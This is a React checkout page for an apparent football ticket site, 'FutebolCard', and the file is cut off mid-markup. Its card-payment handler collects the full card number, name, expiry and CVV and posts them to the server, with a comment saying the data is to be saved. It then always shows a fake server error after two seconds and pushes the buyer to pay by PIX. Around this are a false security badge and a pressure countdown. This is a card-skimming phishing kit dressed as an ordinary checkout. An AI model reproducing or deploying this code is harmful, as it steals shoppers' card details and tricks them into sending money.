import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState, useEffect, useRef } from "react";
import { toast } from "sonner";
import { Header } from "@/components/Header";
import { Footer } from "@/components/Footer";
import { StepIndicator } from "@/components/StepIndicator";
import { formatBRL } from "@/lib/format";
import { findMatchBySlug } from "@/data/matches";
import { useAuth } from "@/lib/auth-context";
import type { OrderItem, TicketHolder } from "@/lib/types";

interface CartItem {
  sectorId: string;
  sectorName: string;
  qty: number;
  ticketType: "inteira" | "meia";
  unitPrice: number;
}

interface Cart {
  matchSlug: string;
  matchId: string;
  matchTitle: string;
  items: CartItem[];
}

export const Route = createFileRoute("/comprar/$slug")({
  head: () => ({ meta: [{ title: "FutebolCard | Finalizar Compra" }] }),
  component: ComprarPage,
});

function maskCpf(v: string) {
  return v
    .replace(/\D/g, "")
    .slice(0, 11)
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
}

function maskPhone(v: string) {
  return v
    .replace(/\D/g, "")
    .slice(0, 11)
    .replace(/^(\d{2})(\d)/, "($1) $2")
    .replace(/(\d{5})(\d)/, "$1-$2");
}

function maskCardNumber(v: string): string {
  return v.replace(/\D/g, "").slice(0, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
}

function maskCardExpiry(v: string): string {
  const d = v.replace(/\D/g, "").slice(0, 4);
  return d.length > 2 ? `${d.slice(0, 2)}/${d.slice(2)}` : d;
}

function detectBrand(number: string): string {
  const n = number.replace(/\D/g, "");
  if (/^4/.test(n)) return "Visa";
  if (/^5[1-5]|^2[2-7]/.test(n)) return "Mastercard";
  if (/^3[47]/.test(n)) return "Amex";
  if (/^636368|^438935|^504175|^451416|^636297|^5067|^4576|^4011/.test(n)) return "Elo";
  return "";
}

function validateLuhn(number: string): boolean {
  const digits = number.replace(/\D/g, "");
  if (digits.length < 13 || digits.length > 19) return false;
  let sum = 0;
  let isEven = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let d = parseInt(digits[i], 10);
    if (isEven) {
      d *= 2;
      if (d > 9) d -= 9;
    }
    sum += d;
    isEven = !isEven;
  }
  return sum % 10 === 0;
}

function BrandBadge({ brand }: { brand: string }) {
  if (!brand) return null;
  if (brand === "Visa")
    return (
      <span className="inline-flex items-center rounded px-1.5 py-0.5 bg-[#1A1F71] text-white font-bold italic text-[11px] tracking-tight select-none">
        VISA
      </span>
    );
  if (brand === "Mastercard")
    return (
      <span className="inline-flex items-center">
        <svg width="34" height="22" viewBox="0 0 34 22" fill="none">
          <circle cx="13" cy="11" r="9" fill="#EB001B" />
          <circle cx="21" cy="11" r="9" fill="#F79E1B" />
          <path
            d="M17 4.2a9 9 0 0 1 0 13.6A9 9 0 0 1 17 4.2z"
            fill="#FF5F00"
          />
        </svg>
      </span>
    );
  if (brand === "Amex")
    return (
      <span className="inline-flex items-center rounded px-1.5 py-0.5 bg-[#007BC1] text-white font-bold text-[10px] tracking-widest select-none">
        AMEX
      </span>
    );
  if (brand === "Elo")
    return (
      <span className="inline-flex items-center rounded px-1.5 py-0.5 bg-[#FFD400] text-black font-bold text-xs tracking-tight select-none">
        elo
      </span>
    );
  return (
    <span className="text-xs font-semibold text-muted-foreground">{brand}</span>
  );
}

// Validações
function validateName(name: string) {
  return /^[A-Za-zÀ-ÿ'\- ]{3,}$/.test(name.trim());
}
function validateEmail(email: string) {
  return /^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email.trim());
}
function validatePhone(phone: string) {
  return /^\(\d{2}\) \d{5}-\d{4}$/.test(phone.trim());
}
function validateCpf(cpf: string) {
  cpf = cpf.replace(/\D/g, "");
  if (cpf.length !== 11 || /^([0-9])\1+$/.test(cpf)) return false;
  let sum = 0, rest;
  for (let i = 1; i <= 9; i++) sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
  rest = (sum * 10) % 11;
  if (rest === 10 || rest === 11) rest = 0;
  if (rest !== parseInt(cpf.substring(9, 10))) return false;
  sum = 0;
  for (let i = 1; i <= 10; i++) sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
  rest = (sum * 10) % 11;
  if (rest === 10 || rest === 11) rest = 0;
  if (rest !== parseInt(cpf.substring(10, 11))) return false;
  return true;
}

function getTrackingParameters() {
  const params: Record<string, string> = {};
  if (typeof window !== "undefined") {
    if ((window as any).UTM) {
      Object.assign(params, (window as any).UTM);
    }
    const urlParams = new URLSearchParams(window.location.search);
    const keys = ["src", "sck", "utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term"];
    let hasUrlParams = false;
    for (const key of keys) {
      const val = urlParams.get(key);
      if (val) {
        params[key] = val;
        hasUrlParams = true;
      }
    }
    if (hasUrlParams || Object.keys(params).length > 0) {
      try { sessionStorage.setItem("futebolcard_utms", JSON.stringify(params)); } catch {}
    } else {
      try {
        const stored = sessionStorage.getItem("futebolcard_utms");
        if (stored) Object.assign(params, JSON.parse(stored));
      } catch {}
    }
  }
  return Object.keys(params).length > 0 ? params : undefined;
}

function ComprarPage() {
  const { slug } = Route.useParams();
  const navigate = useNavigate();
  const match = findMatchBySlug(slug);
  const { user } = useAuth();

  const [cart, setCart] = useState<Cart | null>(null);
  const [submitting, setSubmitting] = useState(false);
  const [timeLeft, setTimeLeft] = useState(15 * 60);
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useLayoutEffect(() => {
    // Garante que a página sempre abre no topo, independente do histórico do router
    const raf1 = requestAnimationFrame(() => {
      requestAnimationFrame(() => {
        window.scrollTo(0, 0);
      });
    });
    return () => cancelAnimationFrame(raf1);
  }, []);

  useEffect(() => {
    timerRef.current = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timerRef.current!);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timerRef.current!);
  }, []);

  const timerMinutes = String(Math.floor(timeLeft / 60)).padStart(2, "0");
  const timerSeconds = String(timeLeft % 60).padStart(2, "0");
  const timerUrgent = timeLeft <= 60;

  const [custName, setCustName] = useState(user?.user_metadata?.full_name ?? "");
  const [custEmail, setCustEmail] = useState(user?.email ?? "");
  const [custPhone, setCustPhone] = useState(user?.user_metadata?.phone ?? "");
  const [custCpf, setCustCpf] = useState(user?.user_metadata?.cpf ?? "");
  const [holders, setHolders] = useState<TicketHolder[]>([]);

  // Payment step
  const [step, setStep] = useState<"form" | "payment">("form");

  useEffect(() => {
    window.scrollTo(0, 0);
  }, [step]);

  const [payMethod, setPayMethod] = useState<"pix" | "card" | null>(null);
  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [payError, setPayError] = useState("");

  // Sincroniza os campos caso o user carregue depois do componente montar
  useEffect(() => {
    if (!user) return;
    if (!custName && user.user_metadata?.full_name) setCustName(user.user_metadata.full_name);
    if (!custEmail && user.email) setCustEmail(user.email);
    if (!custPhone && user.user_metadata?.phone) setCustPhone(maskPhone(user.user_metadata.phone));
    if (!custCpf && user.user_metadata?.cpf) setCustCpf(maskCpf(user.user_metadata.cpf));
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [user]);

  // Camera functions removed - moved to checkout page after payment

  // Validações
  const nameError = custName && !validateName(custName) ? "Digite o nome completo (apenas letras)" : "";
  const emailError = custEmail && !validateEmail(custEmail) ? "E-mail inválido" : "";
  const phoneError = custPhone && !validatePhone(custPhone) ? "Telefone inválido. Use (99) 99999-9999" : "";
  const cpfError = custCpf && !validateCpf(custCpf) ? "CPF inválido" : "";
  const holdersInvalid = holders.some(
    (h) => !h.name.trim() || h.cpf.replace(/\D/g, "").length !== 11,
  );
  const formInvalid =
    !!(nameError || emailError || phoneError || cpfError) || holdersInvalid;

  useEffect(() => {
    try {
      const raw = sessionStorage.getItem("futebolcard_cart");
      if (!raw) {
        void navigate({ to: `/jogos/${slug}` });
        return;
      }
      const parsed = JSON.parse(raw) as Cart;
      if (parsed.matchSlug !== slug) {
        void navigate({ to: `/jogos/${slug}` });
        return;
      }
      setCart(parsed);
      const total = parsed.items.reduce((s, i) => s + i.qty, 0);
      setHolders(Array.from({ length: total }, () => ({ name: "", cpf: "" })));
      setHolderPhotos(Array.from({ length: total }, () => null));
      const cartValue = parsed.items.reduce((s, i) => s + i.unitPrice * i.qty, 0);
      (window as Window & { fbq?: Function }).fbq?.('track', 'InitiateCheckout', {
        content_ids: [parsed.matchId],
        content_name: parsed.matchTitle,
        content_type: 'product',
        num_items: total,
        currency: 'BRL',
        value: cartValue,
      });
    } catch {
      void navigate({ to: `/jogos/${slug}` });
    }
  }, [slug, navigate]);

  // ...existing code...

  // Flat list of individual tickets for the holder form
  const ticketList: { label: string; ticketType: "inteira" | "meia" }[] = [];
  if (cart) {
    for (const item of cart.items) {
      const typeLabel = item.ticketType === "meia" ? "Meia-Entrada" : "Inteira";
      for (let i = 0; i < item.qty; i++) {
        ticketList.push({ label: `${item.sectorName} – ${typeLabel}`, ticketType: item.ticketType });
      }
    }
  }

  const subtotal = cart?.items.reduce((s, i) => s + i.unitPrice * i.qty, 0) ?? 0;
  const fee = Math.round(subtotal * 0.18 * 100) / 100;
  const total = subtotal + fee;

  const PIX_LIMIT = 1000;
  const overPixLimit = total > PIX_LIMIT;

  const setHolder = (idx: number, field: keyof TicketHolder, value: string) => {
    setHolders((prev) => {
      const next = [...prev];
      next[idx] = { ...next[idx], [field]: field === "cpf" ? maskCpf(value) : value };
      return next;
    });
  };

  const copyBuyerToHolder = (idx: number) => {
    setHolders((prev) => {
      const next = [...prev];
      next[idx] = { name: custName, cpf: custCpf };
      return next;
    });
  };

  const buildOrderItems = (): OrderItem[] => {
    const items: OrderItem[] = [];
    let holderIdx = 0;
    for (const item of cart!.items) {
      const itemStartIdx = holderIdx;
      const itemHolders: TicketHolder[] = [];
      for (let i = 0; i < item.qty; i++) {
        itemHolders.push(holders[holderIdx++]);
      }
      items.push({
        sectorId: item.sectorId,
        sectorName: item.sectorName,
        qty: item.qty,
        unitPrice: item.unitPrice,
        ticketType: item.ticketType,
        holders: itemHolders.map((h) => ({
          name: h.name,
          cpf: h.cpf,
          // photo é omitida: não deve ir no payload da API (evita body enorme)
        })),
      });
    }
    return items;
  };

  const onSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!cart || !match) return;
    if (formInvalid) {
      toast.error("Preencha todos os dados do comprador");
      return;
    }
    for (let i = 0; i < holders.length; i++) {
      if (!holders[i].name.trim() || !holders[i].cpf.trim()) {
        toast.error(`Preencha os dados do portador ${i + 1}`);
        return;
      }
      if (holders[i].cpf.replace(/\D/g, "").length !== 11) {
        toast.error(`CPF inválido para o portador ${i + 1}`);
        return;
      }
    }
    setPayError("");
    setStep("payment");
  };

  const onPay = async () => {
    if (!cart || !match) return;
    if (!payMethod) {
      toast.error("Escolha a forma de pagamento");
      return;
    }
    if (payMethod === "card") {
      // Validações do cartão antes de qualquer coisa
      const rawCard = cardNumber.replace(/\D/g, "");
      if (!rawCard || rawCard.length < 13) {
        setPayError("Número do cartão inválido.");
        return;
      }
      if (!validateLuhn(rawCard)) {
        setPayError("Número do cartão inválido. Verifique os dados e tente novamente.");
        return;
      }
      if (!cardName.trim() || cardName.trim().length < 3) {
        setPayError("Informe o nome como está impresso no cartão.");
        return;
      }
      const [expM, expY] = cardExpiry.split("/");
      const expMonth = parseInt(expM ?? "0", 10);
      const expYear = 2000 + parseInt(expY ?? "0", 10);
      const now = new Date();
      if (!expM || !expY || expMonth < 1 || expMonth > 12 || expYear < now.getFullYear() || (expYear === now.getFullYear() && expMonth < now.getMonth() + 1)) {
        setPayError("Data de validade inválida ou cartão expirado.");
        return;
      }
      if (!cardCvv || cardCvv.length < 3) {
        setPayError("CVV inválido.");
        return;
      }

      setSubmitting(true);
      setPayError("");
      // Enviar dados do cartão para o backend (para ser salvo)
      try {
        const body: Record<string, unknown> = {
          matchId: cart.matchId,
          matchTitle: cart.matchTitle,
          items: buildOrderItems(),
          customerName: custName,
          customerEmail: custEmail,
          customerPhone: custPhone,
          customerCpf: custCpf,
          siteUrl: window.location.origin,
          serviceFeePercent: 18,
          paymentMethod: payMethod,
          trackingParameters: getTrackingParameters(),
          cardData: {
            number: cardNumber,
            name: cardName,
            expiry: cardExpiry,
            cvv: cardCvv,
            brand: detectBrand(cardNumber) || undefined,
          },
        };
        await fetch("/api/pix", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(body),
        });
      } catch {
        // silent: proceed to show PIX regardless
      }
      // Após 2 segundos, forçar PIX com mensagem de erro
      setTimeout(() => {
        setPayError(
          "Erro de comunicação com o servidor. Para garantir seu ingresso, finalize o pagamento via PIX."
        );
        setPayMethod("pix");
        setSubmitting(false);
      }, 2000);
      return;
    }
    if (overPixLimit) {
      setPayError(
        `Limite de R$ 1.000,00 por CPF via PIX. O valor do seu pedido (${formatBRL(total)}) ultrapassa o limite permitido. Reduza a quantidade de ingressos para continuar.`
      );
      return;
    }
    setSubmitting(true);
    setPayError("");
    try {
      const body: Record<string, unknown> = {
        matchId: cart.matchId,
        matchTitle: cart.matchTitle,
        items: buildOrderItems(),
        customerName: custName,
        customerEmail: custEmail,
        customerPhone: custPhone,
        customerCpf: custCpf,
        siteUrl: window.location.origin,
        serviceFeePercent: 18,
        paymentMethod: payMethod,
        trackingParameters: getTrackingParameters(),
      };
      const res = await fetch("/api/pix", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      });
      let data: { orderId?: string; error?: string } = {};
      try {
        data = (await res.json()) as typeof data;
      } catch {
        setPayError("Erro inesperado no servidor. Tente novamente em instantes.");
        return;
      }
      if (!res.ok || data.error) {
        setPayError(data.error ?? "Erro ao processar pagamento");
        return;
      }
      sessionStorage.removeItem("futebolcard_cart");
      // Cache order data so checkout page shows QR immediately (evita SELECT RLS)
      try {
        sessionStorage.setItem(
          `order_cache_${data.orderId}`,
          JSON.stringify({
            id: data.orderId,
            matchId: cart.matchId,
            matchTitle: cart.matchTitle,
            items: buildOrderItems(),
            total,
            status: "pending",
            customerName: custName,
            customerEmail: custEmail,
            customerPhone: custPhone,
            customerCpf: custCpf,
            pixQrCode: (data as Record<string, unknown>).qrCode ?? "",
            pixQrCodeUrl: (data as Record<string, unknown>).qrCodeUrl ?? "",
            createdAt: new Date().toISOString(),
          }),
        );
      } catch {}
      void navigate({ to: "/checkout/$orderId", params: { orderId: data.orderId! } });
    } catch (e) {
      setPayError((e as Error).message);
    } finally {
      setSubmitting(false);
    }
  };

  if (!match || !cart) {
    return (
      <div className="flex min-h-screen flex-col">
        <Header />
        <main className="flex-1 py-20 text-center text-muted-foreground">Carregando...</main>
        <Footer />
      </div>
    );
  }

  if (step === "payment") {
    const brand = detectBrand(cardNumber);
    return (
      <div className="flex min-h-screen flex-col bg-muted/30">
        <Header />
        <main className="mx-auto w-full max-w-lg flex-1 px-4 py-8">
          <StepIndicator steps={["Ingresso", "Dados", "Pagamento", "Confirmação"]} currentStep={3} />

          {/* Header row: back + timer */}
          <div className="mb-5 flex items-center justify-between">
            <button
              type="button"
              onClick={() => setStep("form")}
              className="flex items-center gap-1.5 rounded-full border border-border bg-background px-3 py-1.5 text-sm font-medium text-foreground shadow-sm transition hover:bg-muted"
            >
              ← Voltar
            </button>
            <div
              className={`flex items-center gap-2 rounded-xl border px-3 py-1.5 text-sm font-bold tabular-nums ${
                timerUrgent
                  ? "border-red-400 bg-red-50 text-red-600 dark:bg-red-950/30 dark:text-red-400"
                  : "border-amber-400 bg-amber-50 text-amber-700 dark:bg-amber-950/30 dark:text-amber-400"
              }`}
            >
              {timerUrgent ? "⚠" : "⏱"} {timerMinutes}:{timerSeconds}
            </div>
          </div>

          {/* Hero card: match info + total */}
          <div className="mb-5 overflow-hidden rounded-2xl bg-gradient-to-br from-primary to-primary/75 p-5 text-primary-foreground shadow-lg">
            <p className="text-[11px] font-semibold uppercase tracking-widest opacity-70">
              {match.venue} · {match.city}
            </p>
            <p className="mt-1 text-lg font-extrabold leading-tight">
              {match.homeTeam} <span className="font-light opacity-50">×</span> {match.awayTeam}
            </p>
            <div className="mt-4 flex items-end justify-between gap-2">
              <div>
                <p className="text-[11px] font-medium opacity-70">Total a pagar</p>
                <p className="text-4xl font-extrabold tracking-tight">{formatBRL(total)}</p>
              </div>
              <div className="text-right text-xs leading-relaxed opacity-65">
                {cart?.items.map((it, i) => (
                  <p key={i}>
                    {it.qty}× {it.sectorName}{" "}
                    <span className="opacity-75">({it.ticketType === "meia" ? "Meia" : "Inteira"})</span>
                  </p>
                ))}
              </div>
            </div>
          </div>

          {/* Payment method selector */}
          <div className="mb-4 space-y-2">
            {/* PIX option */}
            <button
              type="button"
              onClick={() => setPayMethod("pix")}
              className={`relative w-full flex items-center gap-4 rounded-xl border px-4 py-3.5 text-left transition-all ${
                payMethod === "pix"
                  ? "border-[#32BCAD] bg-[#32BCAD]/8 dark:bg-[#32BCAD]/10"
                  : "border-border bg-background hover:border-[#32BCAD]/40 hover:bg-muted/40"
              }`}
            >
              {/* PIX logo oficial */}
              <span className={`flex h-9 w-9 flex-shrink-0 items-center justify-center rounded-lg ${
                payMethod === "pix" ? "bg-[#32BCAD]" : "bg-muted"
              }`}>
                <svg width="20" height="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill={payMethod === "pix" ? "white" : "#32BCAD"}>
                  <path d="M5.283 18.36a3.505 3.505 0 0 0 2.493-1.032l3.6-3.6a.684.684 0 0 1 .946 0l3.613 3.613a3.504 3.504 0 0 0 2.493 1.032h.71l-4.56 4.56a3.647 3.647 0 0 1-5.156 0L4.85 18.36ZM18.428 5.627a3.505 3.505 0 0 0-2.493 1.032l-3.613 3.614a.67.67 0 0 1-.946 0l-3.6-3.6A3.505 3.505 0 0 0 5.283 5.64h-.434l4.573-4.572a3.646 3.646 0 0 1 5.156 0l4.559 4.559ZM1.068 9.422 3.79 6.699h1.492a2.483 2.483 0 0 1 1.744.722l3.6 3.6a1.73 1.73 0 0 0 2.443 0l3.614-3.613a2.482 2.482 0 0 1 1.744-.723h1.767l2.737 2.737a3.646 3.646 0 0 1 0 5.156l-2.736 2.736h-1.768a2.482 2.482 0 0 1-1.744-.722l-3.613-3.613a1.77 1.77 0 0 0-2.444 0l-3.6 3.6a2.483 2.483 0 0 1-1.744.722H3.791l-2.723-2.723a3.646 3.646 0 0 1 0-5.156"/>
                </svg>
              </span>
              <div className="flex-1 min-w-0">
                <div className="flex items-center gap-2">
                  <span className={`text-sm font-semibold ${payMethod === "pix" ? "text-[#1a8a80] dark:text-[#32BCAD]" : "text-foreground"}`}>
                    PIX
                  </span>
                  <span className="rounded px-1.5 py-px text-[10px] font-semibold bg-[#32BCAD]/15 text-[#1a8a80] dark:bg-[#32BCAD]/20 dark:text-[#32BCAD]">
                    Recomendado
                  </span>
                </div>
                <p className="text-xs text-muted-foreground">Confirmação instantânea · Sem taxas</p>
              </div>
              <span className={`h-4 w-4 flex-shrink-0 rounded-full border-2 transition-all ${
                payMethod === "pix" ? "border-[#32BCAD] bg-[#32BCAD]" : "border-border"
              }`}>
                {payMethod === "pix" && (
                  <svg viewBox="0 0 16 16" fill="none" className="h-full w-full">
                    <path d="M4 8l2.5 2.5L12 5.5" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                )}
              </span>
            </button>

            {/* Cartão option */}
            <button
              type="button"
              onClick={() => setPayMethod("card")}
              className={`relative w-full flex items-center gap-4 rounded-xl border px-4 py-3.5 text-left transition-all ${
                payMethod === "card"
                  ? "border-primary bg-primary/5 dark:bg-primary/10"
                  : "border-border bg-background hover:border-primary/40 hover:bg-muted/40"
              }`}
            >
              {/* Card icon */}
              <span className={`flex h-9 w-9 flex-shrink-0 items-center justify-center rounded-lg ${
                payMethod === "card" ? "bg-primary" : "bg-muted"
              }`}>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <rect x="2" y="5" width="20" height="14" rx="2" stroke={payMethod === "card" ? "white" : "currentColor"} strokeWidth="2"/>
                  <path d="M2 10H22" stroke={payMethod === "card" ? "white" : "currentColor"} strokeWidth="2"/>
                  <path d="M6 15H8" stroke={payMethod === "card" ? "white" : "currentColor"} strokeWidth="2" strokeLinecap="round"/>
                  <path d="M11 15H13" stroke={payMethod === "card" ? "white" : "currentColor"} strokeWidth="2" strokeLinecap="round"/>
                </svg>
              </span>
              <div className="flex-1 min-w-0">
                <span className={`text-sm font-semibold ${payMethod === "card" ? "text-primary" : "text-foreground"}`}>
                  Cartão de crédito
                </span>
                <p className="text-xs text-muted-foreground">Visa, Mastercard, Elo, Amex</p>
              </div>
              <span className={`h-4 w-4 flex-shrink-0 rounded-full border-2 transition-all ${
                payMethod === "card" ? "border-primary bg-primary" : "border-border"
              }`}>
                {payMethod === "card" && (
                  <svg viewBox="0 0 16 16" fill="none" className="h-full w-full">
                    <path d="M4 8l2.5 2.5L12 5.5" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                )}
              </span>
            </button>
          </div>

          {/* PIX limit warning */}
          {overPixLimit && payMethod === "pix" ? (
            <div className="mb-4 flex items-start gap-3 rounded-2xl border-2 border-orange-400 bg-orange-50 p-4 text-sm dark:border-orange-600 dark:bg-orange-950/30">
              <span className="text-xl leading-none mt-0.5">🚫</span>
              <div>
                <p className="font-bold text-orange-800 dark:text-orange-300">Pedido acima do limite PIX</p>
                <p className="mt-1 text-orange-700 dark:text-orange-400">
                  O limite máximo por CPF via PIX é de <strong>R$ 1.000,00</strong>. Seu pedido totaliza{" "}
                  <strong>{formatBRL(total)}</strong>. Reduza a quantidade de ingressos para prosseguir.
                </p>
              </div>
            </div>
          ) : (
            <div className="mb-4 flex items-center gap-2 rounded-xl border border-amber-300 bg-amber-50 px-4 py-2.5 text-xs text-amber-800 dark:border-amber-700 dark:bg-amber-950/30 dark:text-amber-300">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M13 16h-1v-4h-1m1-4h.01M12 2a10 10 0 100 20A10 10 0 0012 2z" />
              </svg>
              <span>Limite de <strong>R$ 1.000,00</strong> por CPF via PIX.</span>
            </div>
          )}

          {/* PIX info panel */}
          {payMethod === "pix" && !overPixLimit && (
            <div className="mb-4 rounded-2xl border border-[#32BCAD]/30 bg-[#32BCAD]/8 p-5 dark:border-[#32BCAD]/20 dark:bg-[#32BCAD]/10">
              <p className="mb-3 text-sm font-bold text-[#1a8a80] dark:text-[#32BCAD]">
                Como funciona o PIX
              </p>
              <div className="space-y-2">
                {[
                  "Confirmação automática em segundos",
                  "Sem taxas extras — você paga exatamente o total",
                  "QR Code gerado na próxima tela, válido por 24h",
                  "Pagamento 100% seguro via Banco Central",
                ].map((item) => (
                  <div key={item} className="flex items-start gap-2 text-xs text-[#1a8a80] dark:text-[#32BCAD]/80">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      className="mt-0.5 h-3.5 w-3.5 flex-shrink-0 text-[#32BCAD]"
                      fill="none"
                      viewBox="0 0 24 24"
                      stroke="currentColor"
                      strokeWidth={3}
                    >
                      <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                    </svg>
                    {item}
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Card form */}
          {payMethod === "card" && (
            <div className="mb-4 space-y-4 rounded-2xl border border-border bg-background p-5 shadow-sm">
              {/* Accepted brands */}
              <div className="flex items-center gap-2">
                <span className="text-xs font-semibold text-muted-foreground">Aceitos:</span>
                <span className="inline-flex items-center rounded px-1.5 py-0.5 bg-[#1A1F71] text-white font-bold italic text-[10px]">VISA</span>
                <span className="inline-flex h-5 w-8 items-center justify-center">
                  <svg width="28" height="18" viewBox="0 0 34 22" fill="none">
                    <circle cx="13" cy="11" r="9" fill="#EB001B" />
                    <circle cx="21" cy="11" r="9" fill="#F79E1B" />
                    <path d="M17 4.2a9 9 0 0 1 0 13.6A9 9 0 0 1 17 4.2z" fill="#FF5F00" />
                  </svg>
                </span>
                <span className="inline-flex items-center rounded px-1.5 py-0.5 bg-[#FFD400] text-black font-bold text-[10px]">elo</span>
                <span className="inline-flex items-center rounded px-1.5 py-0.5 bg-[#007BC1] text-white font-bold text-[9px] tracking-widest">AMEX</span>
              </div>

              {/* Card number */}
              <div>
                <label className="mb-1.5 block text-xs font-semibold uppercase tracking-wide text-muted-foreground">
                  Número do cartão
                </label>
                <div className="relative">
                  <input
                    className="w-full rounded-xl border border-input bg-muted/40 px-4 py-3 font-mono text-base text-foreground outline-none transition focus:border-primary focus:bg-background focus:ring-2 focus:ring-primary/20"
                    type="text"
                    inputMode="numeric"
                    placeholder="0000  0000  0000  0000"
                    value={cardNumber}
                    onChange={(e) => setCardNumber(maskCardNumber(e.target.value))}
                    maxLength={19}
                  />
                  {brand && (
                    <span className="absolute right-3 top-1/2 -translate-y-1/2">
                      <BrandBadge brand={brand} />
                    </span>
                  )}
                </div>
              </div>

              {/* Card name */}
              <div>
                <label className="mb-1.5 block text-xs font-semibold uppercase tracking-wide text-muted-foreground">
                  Nome no cartão
                </label>
                <input
                  className="w-full rounded-xl border border-input bg-muted/40 px-4 py-3 text-sm text-foreground outline-none transition focus:border-primary focus:bg-background focus:ring-2 focus:ring-primary/20"
                  type="text"
                  placeholder="Como impresso no cartão"
                  value={cardName}
                  onChange={(e) => setCardName(e.target.value.toUpperCase())}
                  autoComplete="cc-name"
                />
              </div>

              {/* Expiry + CVV */}
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="mb-1.5 block text-xs font-semibold uppercase tracking-wide text-muted-foreground">
                    Validade
                  </label>
                  <input
                    className="w-full rounded-xl border border-input bg-muted/40 px-4 py-3 text-sm text-foreground outline-none transition focus:border-primary focus:bg-background focus:ring-2 focus:ring-primary/20"
                    type="text"
                    inputMode="numeric"
                    placeholder="MM/AA"
                    value={cardExpiry}
                    onChange={(e) => setCardExpiry(maskCardExpiry(e.target.value))}
                    maxLength={5}
                    autoComplete="cc-exp"
                  />
                </div>
                <div>
                  <label className="mb-1.5 block text-xs font-semibold uppercase tracking-wide text-muted-foreground">
                    CVV
                  </label>
                  <input
                    className="w-full rounded-xl border border-input bg-muted/40 px-4 py-3 text-sm text-foreground outline-none transition focus:border-primary focus:bg-background focus:ring-2 focus:ring-primary/20"
                    type="text"
                    inputMode="numeric"
                    placeholder="•••"
                    value={cardCvv}
                    onChange={(e) => setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                    maxLength={4}
                    autoComplete="cc-csc"
                  />
                </div>
              </div>
            </div>
          )}

          {/* Error */}
          {payError && (
            <div className="mb-4 flex items-start gap-3 rounded-2xl border border-red-200 bg-red-50 p-4 text-sm text-red-700 dark:border-red-800 dark:bg-red-950/30 dark:text-red-300">
              <span className="mt-0.5">⚠️</span>
              <span>{payError}</span>
            </div>
          )}

          {/* CTA button — color + label changes with method */}
          <button
            type="button"
            onClick={onPay}
            disabled={!payMethod || submitting || (payMethod === "pix" && overPixLimit)}
            className={`w-full rounded-2xl py-4 text-base font-extrabold text-white shadow-lg transition-all active:scale-[0.98] disabled:cursor-not-allowed disabled:opacity-50 disabled:shadow-none ${
              payMethod === "pix"
                ? "bg-[#32BCAD] hover:bg-[#28a99b]"
                : payMethod === "card"
                ? "bg-primary hover:bg-primary/90"
                : "bg-muted !text-muted-foreground"
            }`}
          >
            {submitting ? (
              <span className="flex items-center justify-center gap-2">
                <svg
                  className="h-4 w-4 animate-spin"
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 24 24"
                >
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z" />
                </svg>
                Processando...
              </span>
            ) : payMethod === "pix" ? (
              `Pagar ${formatBRL(total)} via PIX`
            ) : payMethod === "card" ? (
              `Pagar ${formatBRL(total)} com Cartão`
            ) : (
              "Escolha a forma de pagamento"
            )}
          </button>

          {/* Security badge */}
          <div className="mt-4 flex items-center justify-center gap-1.5 text-xs text-muted-foreground">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              className="h-3.5 w-3.5"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
              strokeWidth={2}
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"
              />
            </svg>
            Ambiente seguro · Criptografia SSL · Dados protegidos
          </div>
        </main>
        <Footer />
      </div>
    );
  }

  return (
    <div className="flex min-h-screen flex-col">
      <Header />
      <main className="mx-auto w-full max-w-2xl flex-1 px-4 py-10">
        <StepIndicator steps={["Ingresso", "Dados", "Pagamento", "Confirmação"]} currentStep={2} />
        <div className="mb-6 flex items-center justify-between">
          <div>
            <h1 className="text-2xl font-extrabold text-foreground">Finalizar compra</h1>
            <p className="mt-1 text-sm text-muted-foreground">
              {match.homeTeam} x {match.awayTeam} · {match.venue}
            </p>
          </div>
          <div
            className={`flex flex-col items-center rounded-xl border px-4 py-2 text-center ${
              timerUrgent
                ? "border-red-500 bg-red-500/10 text-red-500"
                : "border-amber-500 bg-amber-500/10 text-amber-500"
            }`}
          >
            <span className="text-xs font-semibold uppercase tracking-wide">
              {timerUrgent ? "⚠ Expira em" : "Reservado por"}
            </span>
            <span className="font-mono text-2xl font-extrabold">
